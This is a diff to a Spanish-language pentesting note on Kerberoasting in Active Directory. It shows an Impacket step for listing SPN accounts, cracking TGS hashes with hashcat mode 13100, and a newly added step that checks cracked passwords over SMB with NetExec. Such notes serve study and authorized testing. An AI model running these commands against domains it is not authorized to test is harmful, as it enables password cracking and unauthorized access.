@@ -23,7 +23,6 @@ Para que el ataque se pueda llevar acabo sin interrupciones será necesario tene
 
 # Fases
 ## Listar cuentas SPN del dominio
-
 Recopilaremos una lista de las `SPN` del dominio para posteriormente poder extraer los tickets usando la herramienta [[IMPACKET]]
 
 ```shell
@@ -47,6 +46,13 @@ También podemos facilitar el trabajo extrayendo los tickets en un archivo añad
 hashcat -m 13100 <hashes> /ruta/a/wordlist
  ```
 
-Nos dara las contraseñas
+Nos dará las contraseñas en texto claro en caso de que estas sean vulnerables
 
 ## Validación de credenciales
+Validaremos la credenciales usando la herramienta [[NETEXEC]]
+
+```shell
+nxc smb <IP> -u <user> -p <password>
+```
+
+
